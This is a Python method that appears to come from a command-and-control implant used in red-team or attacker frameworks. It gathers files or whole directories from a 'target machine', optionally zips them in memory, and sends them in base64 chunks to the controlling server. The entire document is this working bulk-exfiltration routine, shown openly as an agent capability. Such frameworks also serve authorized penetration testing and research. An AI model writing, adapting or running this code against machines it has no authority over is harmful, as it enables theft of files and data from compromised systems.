def download_bulk(self, task_id, path, mode="archive"):
        """
        Bulk download files or a directory from the target machine.

        Args:
            task_id: The task identifier for this operation.
            path: A file path, directory path, or JSON list of file paths (absolute paths).
            mode: "iterative" to send files one by one, or "archive" to bundle into
                  an in-memory zip and send as a single file (default: "archive").
        """
        import zipfile
        import io

        # Resolve the list of files to download
        file_list = []

        # Check if path is a JSON list of files
        if isinstance(path, list):
            file_list = path
        else:
            # Normalise to absolute path
            abs_path = path if os.path.isabs(path) \
                else os.path.join(self.current_directory, path)

            if os.path.isdir(abs_path):
                # Walk the directory and collect all files
                for root, dirs, files in os.walk(abs_path):
                    for fname in files:
                        file_list.append(os.path.join(root, fname))
            elif os.path.isfile(abs_path):
                file_list = [abs_path]
            else:
                return "Path does not exist or is not accessible: {}".format(abs_path)

        if not file_list:
            return "No files found to download."

        # Normalise all paths in the list to absolute paths
        resolved = []
        for f in file_list:
            abs_f = f if os.path.isabs(f) else os.path.join(self.current_directory, f)
            resolved.append(abs_f)
        file_list = resolved

        # Cache the task reference once to avoid repeated O(n) lookups inside loops
        task_ref = [task for task in self.taskings if task["task_id"] == task_id][0]

        results = []

        if mode == "iterative":
            # Download each file individually using the same chunked approach as download()
            for file_path in file_list:
                if task_ref["stopped"]:
                    return "Job stopped."

                if not os.path.isfile(file_path):
                    results.append("Skipped (not a file): {}".format(file_path))
                    continue

                file_size = os.stat(file_path).st_size
                total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

                data = {
                    "action": "post_response",
                    "responses": [{
                        "task_id": task_id,
                        "download": {
                            "total_chunks": total_chunks,
                            "full_path": file_path,
                            "chunk_size": CHUNK_SIZE
                        }
                    }]
                }
                initial_response = self.postMessageAndRetrieveResponse(data)
                file_id = initial_response["responses"][0]["file_id"]
                chunk_num = 1

                with open(file_path, 'rb') as f:
                    while True:
                        if task_ref["stopped"]:
                            return "Job stopped."

                        content = f.read(CHUNK_SIZE)
                        if not content:
                            break

                        data = {
                            "action": "post_response",
                            "responses": [{
                                "task_id": task_id,
                                "download": {
                                    "chunk_num": chunk_num,
                                    "file_id": file_id,
                                    "chunk_data": base64.b64encode(content).decode()
                                }
                            }]
                        }
                        chunk_num += 1
                        self.postMessageAndRetrieveResponse(data)

                results.append(json.dumps({"agent_file_id": file_id, "file_path": file_path}))

            return "\n".join(results)

        else:
            # Archive mode: build an in-memory zip and send it as a single file
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
                for file_path in file_list:
                    if task_ref["stopped"]:
                        return "Job stopped."

                    if not os.path.isfile(file_path):
                        continue

                    # Use a relative arcname so the zip doesn't embed absolute paths
                    arcname = os.path.basename(file_path)
                    # If multiple files share the same basename, preserve uniqueness
                    if arcname in zf.namelist():
                        arcname = file_path.lstrip(os.sep).replace(os.sep, "_")
                    zf.write(file_path, arcname)

            zip_data = zip_buffer.getvalue()
            zip_buffer.close()

            archive_name = "download_bulk_{}.zip".format(task_id)
            total_chunks = int(len(zip_data) / CHUNK_SIZE) + (len(zip_data) % CHUNK_SIZE > 0)

            data = {
                "action": "post_response",
                "responses": [{
                    "task_id": task_id,
                    "download": {
                        "total_chunks": total_chunks,
                        "full_path": archive_name,
                        "chunk_size": CHUNK_SIZE
                    }
                }]
            }
            initial_response = self.postMessageAndRetrieveResponse(data)
            file_id = initial_response["responses"][0]["file_id"]
            chunk_num = 1
            offset = 0

            while offset < len(zip_data):
                if task_ref["stopped"]:
                    return "Job stopped."

                chunk = zip_data[offset:offset + CHUNK_SIZE]
                data = {
                    "action": "post_response",
                    "responses": [{
                        "task_id": task_id,
                        "download": {
                            "chunk_num": chunk_num,
                            "file_id": file_id,
                            "chunk_data": base64.b64encode(chunk).decode()
                        }
                    }]
                }
                chunk_num += 1
                offset += CHUNK_SIZE
                self.postMessageAndRetrieveResponse(data)

            return json.dumps({"agent_file_id": file_id})
